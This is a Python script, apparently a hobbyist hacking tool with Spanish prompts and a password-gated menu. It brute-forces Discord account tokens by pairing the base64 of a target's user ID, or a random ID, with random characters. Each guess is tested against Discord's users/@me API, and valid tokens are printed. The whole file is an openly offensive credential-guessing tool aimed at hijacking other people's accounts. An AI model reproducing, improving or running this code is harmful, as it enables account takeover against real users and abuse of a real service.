import sched, time 
import os
from urllib.request import urlopen, Request
import base64
import random
import string
import requests
from colorama import *
import sys
from tkinter import messagebox
import re
import json

def banner():
    print("")
    print(f"""
    ████████╗  ██████╗  ██╗  ██╗ ███████╗ ███╗   ██╗ ██████╗  ███████╗   
    ╚══██╔══╝ ██╔═══██╗ ██║ ██╔╝ ██╔════╝ ████╗  ██║ ██╔══██╗ ██╔════╝   
       ██║    ██║   ██║ █████╔╝  █████╗   ██╔██╗ ██║ ██████╔╝ █████╗     
       ██║    ██║   ██║ ██╔═██╗  ██╔══╝   ██║╚██╗██║ ██╔══██╗ ██╔══╝    
       ██║    ╚██████╔╝ ██║  ██╗ ███████╗ ██║ ╚████║ ██████╔╝ ██║        
       ╚═╝     ╚═════╝  ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚═╝                           """)
                                                                 

def idbf():
    print(f"[$] ID a realizar el Bruteforce:", end=" ")
    id = input()
    if (id.isdigit()):
        if (len(id) == 18):
            idutf8 = id.encode("UTF-8")
            idencode = base64.b64encode(idutf8)
            idencode1 = idencode.decode("UTF-8")
            print(f'[$] ID válida, presione "enter" para iniciar el bruteforce')
            que = input()
            if (que == ""):
                request_url = "https://discordapp.com/api/v6/users/@me"

                def check():
                    token = ""
                    while True:
                        try:

                            caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
                            token = idencode1 + ('').join(random.choices(caracteres, k=35))

                            headers = {'Authorization': token, 'Content-Type': 'application/json'}  
                            req = requests.get(request_url, headers=headers)

                            if req.status_code == 401:
                                print(f"[-] Inválido: {token}")

                            elif req.status_code == 200:
                                print(f"[+] Válido: {token}")
                                messagebox.showinfo(message=f"¡Token encontrado!", title="[$] Token Bruteforce Script by BadBoy")
                                break

                        except KeyboardInterrupt:
                            print("")
                            print(f"[$] Bruteforce terminado")
                            break
                check()
        else:
            print(f"[$] ID inválida, inténtelo de nuevo")
            q = input()
            if (q == ""):
                idbf()
            else:
                idbf()
    else:
        print(f"[$] ID inválida inténtelo de nuevo")
        q = input()
        if (q == ""):
            idbf()
        else:
            idbf()

def randombf():
            request_url = "https://discordapp.com/api/v8/users/@me"

            def check1():
                    token1 = ""
                    while True:
                        try:
                            ids = list(['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])
                            ide = ('').join(random.choices(ids, k=18))
                            ideutf8 = ide.encode("UTF-8")
                            ideencode = base64.b64encode(ideutf8)
                            ideencode1 = ideencode.decode("UTF-8")

                            caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
                            token1 = ideencode1 + ('').join(random.choices(caracteres, k=35))

                            headers = {'Authorization': token1, 'Content-Type': 'application/json'}  
                            req = requests.get(request_url, headers=headers)

                            if req.status_code == 401:
                                print(f"[$] Inválido: {token1}")

                            elif req.status_code == 200:
                                print(f"[$] Válido: {token1}")
                                messagebox.showinfo(message=f"¡Token encontrado!", title="[$] Token Bruteforce Script by BadBoy")
                        except KeyboardInterrupt:
                            print("")
                            print(f"[$] Bruteforce terminado")
                            break
                        
                        
            check1()

def menu(): 
    os.system("@title   [$]  Token Bruteforce Script by Infecting && cls")
    banner()
    print(f"[$] Dev: Infecting")
    print("")
    print(f"[$] Escoja una opción a realizar: ") 
    print("") 
    print(f"[1] Token Bruteforce por ID") 
    print(f"[2] Token Bruteforce random") 
    print(f"[3] Leave")  
    print("")
    print(f"[$] Opción a escojer: ", end="")
    opcion = input()
    if (opcion == "1"):
        idbf()
    elif (opcion == "2"):
        randombf()

    elif (opcion == "3"):
        os.system("@title   [$]  Leave  && cls")
        banner()
        print(f"[$] Gracias por probar el script de bruteforce de Infecting")
        time.sleep(3)
        exit()        
    else:
        os.system("@title   [$]  Acceso denegado  && cls")
        banner()
        print(f"[$] Escoja una opción válida")
        q = input()
        if (q == ""):
            menu()
        else:
            menu()

#<===============Main==================>#
os.system("@title   [$]  Conectando a herramienta...  && cls")
banner()
print(f"[$] Dev: Infecting")
print("")
print(f"[$] Conectando a la herramienta...")
time.sleep(2)
os.system("@title   [$]  Token Bruteforce Script by Infecting  && cls")
banner()
print(f"[$] Dev: Infecting")
print("")
print(f"[$] Escriba la contraseña para continuar: ", end=f"")
contraseña = input()
if (contraseña == "infecting"):
    os.system("@title   [$]  Acceso concedido  && cls")
    banner()
    print(f"[$] Acceso concedido.")
    time.sleep(3)
    menu()  
else:
    os.system("@title   [$]  Acceso denegado  && cls")
    banner()
    print(f"[$] Acceso denegado")
    q = input()
    if (q == ""):
        os.system('cls')
        sys.exit()
    else:
        os.system('cls')
        sys.exit()




    






